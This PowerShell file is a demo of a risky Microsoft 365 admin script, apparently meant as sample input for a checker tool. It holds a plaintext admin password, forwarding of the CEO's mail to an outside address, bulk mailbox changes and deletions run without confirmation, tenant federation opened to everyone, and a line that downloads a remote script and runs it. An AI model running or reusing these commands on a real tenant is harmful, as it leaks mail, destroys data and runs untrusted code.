# DO NOT RUN. Example of a risky script, used to demo `m365ai check`.
# It mixes several mistakes that show up in real-world admin scripts.

Import-Module MSOnline
$password = "Summer2026!"
$cred = New-Object PSCredential("admin@contoso.com", (ConvertTo-SecureString $password -AsPlainText -Force))
Connect-MsolService -Credential $cred
Connect-ExchangeOnline
Connect-MgGraph

# Forward the CEO's mail to an outside address
Set-Mailbox -Identity ceo@contoso.com -ForwardingSmtpAddress "archive@external-mail.com"

# "Clean up" every mailbox
Get-Mailbox -ResultSize Unlimited | Set-Mailbox -HiddenFromAddressListsEnabled $true -Confirm:$false

# Delete a departed user and their Team
Remove-MgUser -UserId "jdoe@contoso.com"
Remove-Team -GroupId "00000000-0000-0000-0000-000000000000"

# Open federation to everyone
Set-CsTenantFederationConfiguration -AllowFederatedUsers $true -AllowPublicUsers $true

# Pull a "helper" from the internet and run it
(New-Object Net.WebClient).DownloadString("https://example.com/helper.ps1") | iex
